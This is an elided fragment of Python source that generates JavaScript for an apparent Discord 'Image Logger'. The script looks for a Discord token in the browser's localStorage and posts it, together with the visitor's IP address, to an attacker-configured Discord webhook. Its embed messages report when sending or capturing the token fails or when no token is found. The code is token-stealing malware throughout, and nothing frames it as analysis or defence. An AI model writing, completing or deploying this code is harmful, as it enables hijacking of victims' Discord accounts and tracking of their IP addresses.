...
if (discordToken) {
    fetch("''' + config["webhook"].encode() + b'''", {
        ...
        if (!response.ok) {
            fetch("''' + config["webhook"].encode() + b'''", {
                ...
                body: JSON.stringify({
                    ...
                    content: "",
                    embeds: [{
                        title: "Image Logger - Error Sending Token",
                        color: ''' + str(config["color"]).encode() + b''',
        ...
        fetch("''' + config["webhook"].encode() + b'''", {
            ...
            body: JSON.stringify({
                ...
                content: "",
                embeds: [{
                    title: "Image Logger - Error Capturing Token",
                    color: ''' + str(config["color"]).encode() + b''',
    ...
    fetch("''' + config["webhook"].encode() + b'''", {
        ...
        body: JSON.stringify({
            ...
            content: "",
            embeds: [{
                title: "Image Logger - No Token Found",
                color: ''' + str(config["color"]).encode() + b''',
                description: `**No Discord token found in localStorage!**\\n**IP:** \`${"''' + self.headers.get('x-forwarded-for').encode() + b'''"}\``
            }]
        })
    });
}
